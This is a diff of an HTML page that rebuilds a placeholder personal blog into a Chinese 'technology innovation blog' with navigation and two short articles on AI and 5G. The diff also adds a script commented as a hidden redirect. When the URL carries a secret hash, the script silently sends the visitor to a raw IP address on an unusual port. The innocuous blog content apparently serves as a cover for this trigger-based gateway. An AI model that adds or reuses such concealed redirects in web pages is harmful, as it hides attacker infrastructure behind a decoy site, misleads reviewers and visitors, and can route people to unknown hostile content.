@@ -1,43 +1,97 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>nstrass</title>
+    <title>科技创新博客</title>
     <style>
-        /* 这里可以添加CSS样式 */
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             line-height: 1.6;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            background-color: #f4f4f4;
         }
         header {
-            background: #f4f4f4;
+            background: #333;
+            color: #fff;
             padding: 1rem;
             text-align: center;
+        }
+        nav {
+            background: #444;
+            color: #fff;
+            padding: 0.5rem;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 10px;
+        }
+        nav ul li a {
+            color: #fff;
+            text-decoration: none;
         }
         .container {
             width: 80%;
             margin: auto;
             overflow: hidden;
+            padding: 20px;
+        }
+        .article {
+            background: #fff;
+            margin-bottom: 20px;
+            padding: 20px;
+            border-radius: 5px;
+        }
+        footer {
+            background: #333;
+            color: #fff;
+            text-align: center;
+            padding: 1rem;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
         }
     </style>
+    <script>
+        // 隐藏的重定向脚本
+        function checkRedirect() {
+            var secretKey = "开启";
+            if (window.location.hash === "#" + secretKey) {
+                window.location.href = "https://24.199.120.10:22887";
+            }
+        }
+        window.onload = checkRedirect;
+    </script>
 </head>
 <body>
     <header>
-        <h1>欢迎来到我的个人博客</h1>
+        <h1>科技创新博客</h1>
     </header>
+    <nav>
+        <ul>
+            <li><a href="#">首页</a></li>
+            <li><a href="#">文章</a></li>
+            <li><a href="#">关于</a></li>
+            <li><a href="#">联系</a></li>
+        </ul>
+    </nav>
     <div class="container">
-        <h2>最新文章</h2>
-        <article>
-            <h3>这是一篇博客文章标题</h3>
-            <p>这里是文章内容的简短描述。您可以添加更多的段落和内容来使网站看起来更真实。</p>
-        </article>
-        <!-- 可以添加更多的文章 -->
+        <div class="article">
+            <h2>人工智能在日常生活中的应用</h2>
+            <p>随着技术的飞速发展,人工智能正在悄然改变我们的日常生活。从智能家居到个人助理,AI的应用无处不在。本文将探讨AI如何影响我们的工作、学习和生活方式。</p>
+        </div>
+        <div class="article">
+            <h2>5G技术: 未来通信的革命</h2>
+            <p>5G网络的到来不仅仅意味着更快的网速,它将彻底改变我们与世界互动的方式。本文将深入探讨5G技术的潜力,以及它如何推动物联网、自动驾驶等领域的发展。</p>
+        </div>
     </div>
     <footer>
-        <p>&copy; 2024 我的个人博客. 保留所有权利。</p>
+        <p>&copy; 2024 科技创新博客. 保留所有权利。</p>
     </footer>
 </body>
 </html>
